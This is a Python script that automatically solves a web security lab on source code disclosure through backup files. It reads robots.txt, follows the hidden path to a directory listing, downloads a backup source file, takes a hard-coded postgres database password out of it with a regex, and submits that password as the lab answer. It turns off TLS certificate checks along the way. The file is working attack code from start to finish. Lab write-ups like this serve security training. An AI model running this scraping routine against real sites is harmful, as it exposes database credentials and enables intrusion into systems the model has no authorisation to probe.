import requests
from colorama import Fore
import urllib3
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "Source code disclosure via backup files"


def run(url, payload=None, proxies=None):
    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Fetch the robots.txt file\n2. Search for hidden paths\n3. Fetch the hidden path\n4. Extract the path to the backup file\n5. Fetch the backup files\n6. Extract the secret key\n7. Submit the solution\n""")

    url = url.rstrip('/')

    print("[1] Fetching the robots.txt file")
    robots = requests.get(f"{url}/robots.txt", allow_redirects=False,
                           verify=False, proxies=proxies)

    print("[2] Searching for hidden paths")
    hidden_path = re.findall("Disallow: (.*)", robots.text)[0]
    print(Fore.GREEN + "hidden path" + Fore.WHITE +
          " => " + Fore.YELLOW + hidden_path)

    print("[3] Fetching the hidden path")
    backup_dir = requests.get(f"{url}{hidden_path}",  allow_redirects=False,
                              verify=False, proxies=proxies)
    
    print("[4] Extracting the path to the backup file")
    backup_path = re.findall("href='(.*)'>", backup_dir.text)[0]
    print(Fore.GREEN + "backup path" + Fore.WHITE +
          " => " + Fore.YELLOW + backup_path)

    print("[5] Fetching the backup file")
    backup_file = requests.get(f"{url}{backup_path}",  allow_redirects=False,
                              verify=False, proxies=proxies)


    print("[6] Extracting the key")
    key = re.findall(r"\"postgres\",\s*\"postgres\",\s*\"(.*)\"", backup_file.text)[0]
    print(Fore.GREEN + "key" + Fore.WHITE +
          " => " + Fore.YELLOW + key)
    
    print("[7] Submitting the solution")
    data = { "answer": key }
    
    print("[+] Refresh the page if needed")

    requests.post(f"{url}/submitsolution", data=data, allow_redirects=False,
                  verify=False, proxies=proxies)
    return True
